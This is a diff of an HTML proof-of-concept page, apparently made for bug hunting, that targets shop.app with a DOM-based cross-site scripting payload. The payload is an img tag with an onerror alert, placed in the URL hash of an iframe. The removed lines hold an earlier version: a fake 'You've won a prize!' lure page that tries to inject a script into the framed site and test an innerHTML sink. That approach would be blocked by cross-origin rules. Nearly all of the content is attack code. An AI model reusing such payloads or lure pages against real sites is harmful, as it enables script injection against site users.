@@ -1,53 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Demo</title>
+    <style>
+        #victimFrame { 
+            width: 100%; 
+            height: 500px; 
+            border: 2px solid red; /* Makes it easy to see */
+            margin-bottom: 10px;
+        }
+        #triggerButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
 <body>
-  <h1>You've won a prize!</h1>
-  <p>Click below to claim it on Shop.app!</p>
-  <button onclick="startAttack()">Claim Your Prize</button>
+    <h2>1. The target site is loaded below:</h2>
+    <iframe id="victimFrame" src="https://shop.app/"></iframe>
+    
+    <br>
+    <h2>2. Click the button to simulate a user clicking a malicious link on this site:</h2>
+    <button id="triggerButton" onclick="triggerExploit()">Add Malicious Hash</button>
 
-  <iframe id="victimFrame" style="width: 800px; height: 400px; border: 2px solid red;"></iframe>
-  <!-- Make it visible for debugging -->
+    <script>
+        // The malicious payload you want to add to the URL
+        const maliciousHash = "#<img src=x onerror='alert(\"XSS: \" + document.domain)'>";
 
-  <script>
-    function startAttack() {
-      const frame = document.getElementById('victimFrame');
-      // Load the target site FIRST
-      frame.src = "https://shop.app/"; // Start with a clean page
+        function triggerExploit() {
+            const frame = document.getElementById('victimFrame');
+            
+            // Get the current URL of the iframe
+            let currentUrl = frame.src;
+            
+            // Construct the new URL by appending the malicious hash
+            // This uses the DOM's built-in URL handling to do it cleanly
+            let newUrl = new URL(currentUrl);
+            newUrl.hash = maliciousHash; // This correctly handles encoding
 
-      frame.onload = function() {
-        // Wait for the iframe to fully load, including its JS
-        setTimeout(() => {
-          // STEP 1: Get access to the iframe's document
-          const frameDoc = frame.contentDocument || frame.contentWindow.document;
-
-          // STEP 2: Create a new <script> element INSIDE the iframe
-          const script = frameDoc.createElement('script');
-          // STEP 3: Set the script's content to YOUR PROVEN POC CODE
-          script.textContent = `
-            // Your exact PoC code here
-            let maliciousHash = "#<img src=x onerror='alert(\\\\"XSS on: \\\\" + document.domain)'>";
-            let encodedHash = encodeURIComponent(maliciousHash.substring(1));
-            encodedHash = '#' + encodedHash;
-            console.log("What location.hash returns:", encodedHash);
-
-            try {
-              let decodedPayload = decodeURIComponent(encodedHash.substring(1));
-              console.log("After decodeURIComponent:", decodedPayload);
-
-              console.log("Testing innerHTML sink...");
-              let testDiv = document.createElement('div');
-              document.body.appendChild(testDiv);
-              testDiv.innerHTML = decodedPayload; // This should fire the alert
-
-            } catch(e) {
-              console.error("Error:", e);
-            }
-          `;
-
-          // STEP 4: Inject the script into the iframe's head/body
-          (frameDoc.head || frameDoc.documentElement).appendChild(script);
-          console.log("Injected PoC script into iframe.");
-
-        }, 2000); // Give the target site time to fully initialize
-      };
-    }
-  </script>
+            // Navigate the iframe to the new URL
+            frame.src = newUrl.toString();
+            
+            console.log("Attempting to navigate to:", newUrl.toString());
+        }
+    </script>
 </body>
+</html>
